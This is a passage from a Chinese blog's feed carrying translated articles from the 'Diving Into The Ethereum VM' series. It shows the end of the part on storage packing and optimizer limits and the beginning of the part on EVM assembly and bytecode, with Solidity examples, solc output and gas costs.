编译器可以在标签内进行优化，但不能跨标签进行优化。</p><p>调用函数可能会花费更多，不是因为函数调用很昂贵（它们只是跳转指令），而是因为 <code>sstore</code> 优化可能会失败。</p><p>为了解决这个问题，Solidity 编译器需要学习如何内联函数，本质上得到与不调用函数相同的代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a <span class="token operator">=</span> 0xaaaa<span class="token punctuation">;</span>b <span class="token operator">=</span> 0xbbbb<span class="token punctuation">;</span>c <span class="token operator">=</span> 0xcccc<span class="token punctuation">;</span>d <span class="token operator">=</span> 0xdddd<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>如果我们仔细阅读完整的汇编输出，我们会看到函数 <code>setAB()</code> 和 <code>setCD()</code> 的汇编代码被包含了两次，这会增加代码的大小，从而使您在部署合约时花费额外的 gas。我们后面会在了解合约生命周期时讨论这个问题。</p></blockquote><h2 id="Why-The-Optimizer-Breaks"><a href="#Why-The-Optimizer-Breaks" class="headerlink" title="Why The Optimizer Breaks"></a>Why The Optimizer Breaks</h2><p>优化器不会跨标签进行优化。考虑“1+1”，如果在同一个标签下，可以优化为 <code>0x2</code>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Optimize OK<span class="token operator">!</span>tag_0:  0x1  0x1  <span class="token function">add</span>  <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>但如果指令由标签分隔，就不是这样了：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Optimize Fail<span class="token operator">!</span>tag_0:  0x1  0x1tag_1:  <span class="token function">add</span>  <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>从版本 0.4.13 开始，此行为是正确的。将来可能会改变。</p><h2 id="Breaking-The-Optimizer-Again"><a href="#Breaking-The-Optimizer-Again" class="headerlink" title="Breaking The Optimizer, Again"></a>Breaking The Optimizer, Again</h2><p>让我们看看优化器失败的另一种方式。打包是否适用于固定长度的数组？考虑：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c-static-array--packing.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint64</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> numbers<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>numbers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>numbers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1111</span><span class="token punctuation">;</span>numbers<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2222</span><span class="token punctuation">;</span>numbers<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x3333</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>同样，我们希望使用一个 <code>sstore</code> 指令将四个 64 位数字打包到一个 32 字节的存储槽中。</p><p>编译的汇编代码太长。让我们只计算 <code>sstore</code> 和 <code>sload</code> 指令的数量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c-static-array--packing.sol <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">'(sstore|sload)'</span>  sload  sstore  sload  sstore  sload  sstore  sload  sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>即使这个固定长度数组与等效结构或存储变量具有完全相同的存储布局，优化也会失败。现在需要四对 <code>sload</code> 和 <code>sstore</code>。</p><p>快速浏览一下汇编代码会发现，每个数组访问都有绑定检查代码，并组织在不同的标签下。但是标签边界会破坏优化。</p><p>不过有一个小小的安慰。 3 个额外的 <code>sstore</code> 指令比第一个便宜：</p><ul><li><code>sstore</code> 首次写入新位置需要 20000 gas</li><li><code>sstore</code> 后续写入现有位置需要 5000 gas</li></ul><p>因此这个特殊的优化失败让我们花费了 35k 而不是 20k，额外增加了 75%。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>如果 Solidity 编译器可以计算出存储变量的大小，它只需将它们一个接一个地放在存储中。如果可能，编译器会将数据紧密打包成 32 字节的块。</p><p>总结一下我们目前看到的打包行为：</p><ul><li>存储变量：是的；</li><li>结构体字段：是的；</li><li>定长数组：没有；理论上，是的。</li></ul><p>因为存储访问成本很高，您应该将存储变量视为您的数据库模式。在编写合约时，进行小型实验并检查程序集以了解编译器是否正确优化可能很有用。</p><p>我们可以肯定，Solidity 编译器将来会改进。但现在，我们不能盲目相信它的优化器。</p><p>Literally，了解您的存储变量是值得的。</p><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part2-—-固定长度数据类型的表示&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part2-—-固定长度数据类型的表示&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part2 — 固定长度数据类型的表示&quot;&gt;&lt;/a&gt;深入</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part1 — 汇编与字节码</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/</id>
    <published>2022-10-07T08:39:34.000Z</published>
    <updated>2022-10-17T04:05:43.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part1-—-汇编与字节码"><a href="#深入以太坊虚拟机-Part1-—-汇编与字节码" class="headerlink" title="深入以太坊虚拟机 Part1 — 汇编与字节码"></a>深入以太坊虚拟机 Part1 — 汇编与字节码</h1><blockquote><p>原文：<a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum Virtual Machine | by Howard | Aug 6, 2017</a></p></blockquote><p>Solidity 提供了许多高级语言抽象，但是这些特性使得人们很难理解程序运行时到底发生了什么。阅读 Solidity 文档仍然使我对非常基本的事情感到困惑。</p><p><code>string</code>，<code>bytes32</code>，<code>byte[]</code>，<code>bytes</code> 有什么区别？</p><ul><li>我该使用哪一个？何时使用？</li><li>当我把 <code>string</code> 转换为 <code>bytes</code> 时会发生什么？能转换为 <code>byte[]</code> 吗？</li><li>它们费用是多少？</li></ul><p>EVM 中如何存储映射(<em>mapping</em>)？</p><ul><li>为什么不能删除一个映射？</li><li>可以使用映射的映射吗？（可以，但它是如何工作的？）</li><li>为什么有存储映射(<em>storage mapping</em>)但没有内存映射(<em>memory mapping</em>)？</li></ul><p>编译后的合约对 EVM 来说是怎样的？</p><ul><li>合约是如何创建的？</li><li>什么是 <code>constructor</code>​？真的吗？</li><li>什么是 <code>fallback</code> 函数？</li></ul><p>我认为学习像 Solidity 这样的高级语言如何在以太坊 VM(EVM) 上运行是一项很好的投资。出于几个原因。</p><ol><li><strong>Solidity 不是最后的语言</strong>​。更好的 EVM 语言将会到来。</li><li><strong>EVM 是一个数据库引擎</strong>。要了解智能合约如何以任何一门 EVM 语言工作，必须理解数据是如何组织、存储和操纵的。</li><li><strong>知道如何成为贡献者</strong>。以太坊工具链还很早。深入了解 EVM 将会帮助您为自己和他人制作出色的工具。</li><li><strong>智力挑战</strong>。EVM 为在密码学、数据结构和编程语言设计的交叉点上发挥作用提供了一个很好的机会。</li></ol><p>在一系列文章中，我想解构简单的 Solidity 合约，以了解它是如何作为 EVM 字节码工作的。</p><p>希望学习和写的内容的大纲：</p><ul><li>EVM 字节码的基础知识</li><li>如何表示不同的类型（映射(<em>mapping</em>)、数组(<em>array</em>)）</li><li>创建新合约时发生了什么</li><li>方法被调用时发生了什么</li><li>ABI 如何桥接不同的 EVM 语言</li></ul><p>我的最终目标是能够完整地理解编译好的 Solidity 合约。让我们从阅读一些基本的 EVM 字节码开始吧！</p><p>这个 <a href="https://gist.github.com/hayeah/bd37a123c02fecffbe629bf98a8391df">EVM 指令集</a> 将是一个有用的参考。</p><h2 id="A-Simple-Contract"><a href="#A-Simple-Contract" class="headerlink" title="A Simple Contract"></a>A Simple Contract</h2><p>我们的第一个合约有一个构造函数和一个状态变量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c1.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>（注：当前 Solidity 已使用 <code>constructor</code> 关键字声明构造函数）</p><p>用 <code>solc</code> 编译这个合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm c1.sol<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> c1.sol:C <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>EVM assembly:    /* <span class="token string">"c1.sol"</span>:26:94  contract C <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */  mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>    /* <span class="token string">"c1.sol"</span>:59:92  <span class="token keyword">function</span> <span class="token function-name function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */  jumpi<span class="token punctuation">(</span>tag_1, iszero<span class="token punctuation">(</span>callvalue<span class="token punctuation">))</span>  0x0  dup1  reverttag_1:tag_2:    /* <span class="token string">"c1.sol"</span>:84:85  <span class="token number">1</span> */  0x1    /* <span class="token string">"c1.sol"</span>:80:81  a */  0x0    /* <span class="token string">"c1.sol"</span>:80:85  a <span class="token operator">=</span> <span class="token number">1</span> */  dup2  swap1  sstore  pop    /* <span class="token string">"c1.sol"</span>:59:92  <span class="token keyword">function</span> <span class="token function-name function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */tag_3:    /* <span class="token string">"c1.sol"</span>:26:94  contract C <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */tag_4:  dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  dup1  dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  0x0  codecopy  0x0  <span class="token builtin class-name">return</span>stopsub_0: assembly <span class="token punctuation">&#123;</span>        /* <span class="token string">"c1.sol"</span>:26:94  contract C <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>. */      mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>    tag_1:      0x0      dup1      revertauxdata: 0xa165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029<span class="token punctuation">&#125;</span>Binary:60606040523415600e57600080fd5b5b60016000819055505b5b60368060266000396000f30060606040525b600080fd00a165627a7a72305820af3193f6fd31031a0e0d2de1ad2c27352b1ce081b4f3c92b5650ca4dd542bb770029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>数字 <code>6060604052...</code> 是 EVM 实际运行的字节码。</p><h2 id="In-Baby-Steps"><a href="#In-Baby-Steps" class="headerlink" title="In Baby Steps"></a>In Baby Steps</h2><p>编译后的汇编语言中一半是样板(boilerplate)，在大多数 Solidity 程序中都是相似的。我们稍后会来回顾。现在，让我们检查一下合约的独特部分，即不起眼的存储变量赋值：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">a <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>此赋值由字节码 <code>6001600081905550</code>表示。让我们将其分解为每行一条指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">60</span> 01<span class="token number">60</span> 00<span class="token number">81</span><span class="token number">90</span><span class="token number">55</span><span class="token number">50</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>EVM 基本上是一个循环，从上到下执行每条指令。让我们用相应的字节码注释汇编代码（在标签 <code>tag_2</code> 下缩进）以更好地了解它们是如何关联的：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // <span class="token number">60</span> 01  0x1  // <span class="token number">60</span> 00  0x0  // <span class="token number">81</span>  dup2  // <span class="token number">90</span>  swap1  // <span class="token number">55</span>  sstore  // <span class="token number">50</span>  pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，汇编代码中的 <code>0x1</code> 实际上是 <code>push(0x1)</code> 的简写。该指令将数字 1 压入堆栈。</p><p>只是盯着它仍然很难理解发生了什么。不过不用担心，逐行模拟 EVM 很简单。</p><h2 id="Simulating-The-EVM"><a href="#Simulating-The-EVM" class="headerlink" title="Simulating The EVM"></a>Simulating The EVM</h2><p>EVM 是一个堆栈机器(stack machine)。指令可能使用堆栈上的值作为参数，并将值作为结果压入堆栈。让我们考虑 <code>add</code> 操作。</p><p>假设堆栈上有两个值：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>当 EVM 看到 <code>add</code> 时，它将顶端的 2 个项加起来，并将结果 push 到堆栈顶端，结果就是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>在下文中，我们将使用 <code>[]</code> 标记堆栈：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 空堆栈stack: <span class="token punctuation">[</span><span class="token punctuation">]</span>// 有 <span class="token number">3</span> 个项的堆栈。顶端是 <span class="token number">3</span>，底部是 <span class="token number">1</span>。stack: <span class="token punctuation">[</span><span class="token number">3</span> <span class="token number">2</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>并使用 <code>&#123;&#125;</code> 标注合约存储：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 存储中什么都没有store: <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>// 值 0x1 存储在位置 0x0store: <span class="token punctuation">&#123;</span> 0x0 <span class="token operator">=</span><span class="token operator">></span> 0x1 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>现在让我们看一些真正的字节码。我们将像 EVM 一样模拟字节码序列 <code>6001600081905550</code> 并在每条指令之后打印机器状态：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">60</span> 01: 将 <span class="token number">1</span> 压入堆栈0x1  stack: <span class="token punctuation">[</span>0x1<span class="token punctuation">]</span>// <span class="token number">60</span> 00: 将 <span class="token number">0</span> 压入堆栈0x0  stack: <span class="token punctuation">[</span>0x0 0x1<span class="token punctuation">]</span>// <span class="token number">81</span>: 复制堆栈上的第 <span class="token number">2</span> 个项dup2  stack: <span class="token punctuation">[</span>0x1 0x0 0x1<span class="token punctuation">]</span>// <span class="token number">90</span>: 交换顶端的 <span class="token number">2</span> 个项swap1  stack: <span class="token punctuation">[</span>0x0 0x1 0x1<span class="token punctuation">]</span>// <span class="token number">55</span>: 存储值 0x1 到位置 0x0// 该指令消耗了顶端 <span class="token number">2</span> 个项sstore  stack: <span class="token punctuation">[</span>0x1<span class="token punctuation">]</span>  store: <span class="token punctuation">&#123;</span> 0x0 <span class="token operator">=</span><span class="token operator">></span> 0x1 <span class="token punctuation">&#125;</span>// <span class="token number">50</span>: pop <span class="token punctuation">(</span>弹出顶端项<span class="token punctuation">)</span>pop  stack: <span class="token punctuation">[</span><span class="token punctuation">]</span>  store: <span class="token punctuation">&#123;</span> 0x0 <span class="token operator">=</span><span class="token operator">></span> 0x1 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>结束。堆栈是空的，并且有一个项在存储中。</p><p>值得注意的是，Solidity 决定将状态变量 <code>uint256 a</code> 存储在位置 <code>0x0</code>。其他语言完全有可能选择将状态变量存储在其他地方。</p><p>在伪代码中，EVM 对 <code>6001600081905550</code> 所做的基本上是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// a <span class="token operator">=</span> <span class="token number">1</span>sstore<span class="token punctuation">(</span>0x0, 0x1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>仔细看，你会发现 dup2, swap1, pop 都是多余的。汇编代码可以更简单。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x10x0sstore<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>你可以尝试模拟上面 3 条指令，并确信它们确实会导致相同的机器状态：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stack: <span class="token punctuation">[</span><span class="token punctuation">]</span>store: <span class="token punctuation">&#123;</span> 0x0 <span class="token operator">=</span><span class="token operator">></span> 0x1 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h2 id="Two-Storage-Variables"><a href="#Two-Storage-Variables" class="headerlink" title="Two Storage Variables"></a>Two Storage Variables</h2><p>让我们添加一个相同类型的额外存储变量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c2.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token builtin">uint256</span> b<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译，重点关注 <code>tag_2</code>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm c2.sol// <span class="token punctuation">..</span>. <span class="token function">more</span> stuff omittedtag_2:    /* <span class="token string">"c2.sol"</span>:99:100  <span class="token number">1</span> */  0x1    /* <span class="token string">"c2.sol"</span>:95:96  a */  0x0    /* <span class="token string">"c2.sol"</span>:95:100  a <span class="token operator">=</span> <span class="token number">1</span> */  dup2  swap1  sstore  pop    /* <span class="token string">"c2.sol"</span>:112:113  <span class="token number">2</span> */  0x2    /* <span class="token string">"c2.sol"</span>:108:109  b */  0x1    /* <span class="token string">"c2.sol"</span>:108:113  b <span class="token operator">=</span> <span class="token number">2</span> */  dup2  swap1  sstore  pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>伪代码形式的汇编：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// a <span class="token operator">=</span> <span class="token number">1</span>sstore<span class="token punctuation">(</span>0x0, 0x1<span class="token punctuation">)</span>// b <span class="token operator">=</span> <span class="token number">2</span>sstore<span class="token punctuation">(</span>0x1, 0x2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们在这里了解到的是，两个存储变量一个接一个地定位，<code>a</code> 位于 <code>0x0</code> 位置，<code>b</code> 位于 <code>0x1</code> 位置。</p><h2 id="Storage-Packing"><a href="#Storage-Packing" class="headerlink" title="Storage Packing"></a>Storage Packing</h2><p>每个槽存储(slot storage)可以存储 32 个字节。如果一个变量只需要 16 个字节，那么使用所有 32 个字节是很浪费的。如果可能，Solidity 通过将两种更小的数据类型打包(pack)到一个存储槽中来优化存储效率。</p><p>让我们改变 <code>a</code> 和 <code>b</code>，使它们每个都只有 16 个字节：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint128</span> a<span class="token punctuation">;</span><span class="token builtin">uint128</span> b<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm c3.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>生成的汇编更加复杂：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:  // a <span class="token operator">=</span> <span class="token number">1</span>  0x1  0x0  dup1  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  pop  // b <span class="token operator">=</span> <span class="token number">2</span>  0x2  0x0  0x10  0x100  exp  dup2  sload  dup2  0xffffffffffffffffffffffffffffffff  mul  not  and  swap1  dup4  0xffffffffffffffffffffffffffffffff  and  mul  or  swap1  sstore  pop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>上面的汇编代码将两个变量打包到一个存储位置(<code>0x0</code>)，就像这样：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>         b         <span class="token punctuation">]</span><span class="token punctuation">[</span>         a         <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span> bytes / <span class="token number">128</span> bits<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">16</span> bytes / <span class="token number">128</span> bits<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>打包的原因是因为到目前为止最昂贵的操作是存储：</p><ul><li><code>sstore</code> 首次写入新位置需要 20000 gas</li><li><code>sstore</code> 需要 5000 gas 用于后续写入已有位置</li><li><code>sload</code> 花费 500 gas</li><li>大多数指令花费 3~10 gas</li></ul><p>通过使用相同的存储位置，Solidity 为第二个存储变量支付 5000 而不是 20000，从而为我们节省了 15000 gas。</p><h2 id="More-Optimization"><a href="#More-Optimization" class="headerlink" title="More Optimization"></a>More Optimization</h2><p>与其用两个单独的 <code>sstore</code> 指令存储 <code>a</code> 和 <code>b</code>，不如将两个 128 位数字一起打包到内存中，然后只使用一个 <code>sstore</code> 存储它们，从而节省额外的 5000 gas。</p><p>您可以通过打开 <code>optimize</code> 标志让 Solidity 进行此优化：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ solc --bin --asm --optimize c3.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>生成的汇编代码只使用一个 <code>sload</code> 和一个 <code>sstore</code>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tag_2:    /* <span class="token string">"c3.sol"</span>:95:96  a */  0x0    /* <span class="token string">"c3.sol"</span>:95:100  a <span class="token operator">=</span> <span class="token number">1</span> */  dup1  sload    /* <span class="token string">"c3.sol"</span>:108:113  b <span class="token operator">=</span> <span class="token number">2</span> */  0x200000000000000000000000000000000  not<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>exp<span class="token punctuation">(</span>0x2, 0x80<span class="token punctuation">)</span>, 0x1<span class="token punctuation">))</span>    /* <span class="token string">"c3.sol"</span>:95:100  a <span class="token operator">=</span> <span class="token number">1</span> */  swap1  swap2  and    /* <span class="token string">"c3.sol"</span>:99:100  <span class="token number">1</span> */  0x1    /* <span class="token 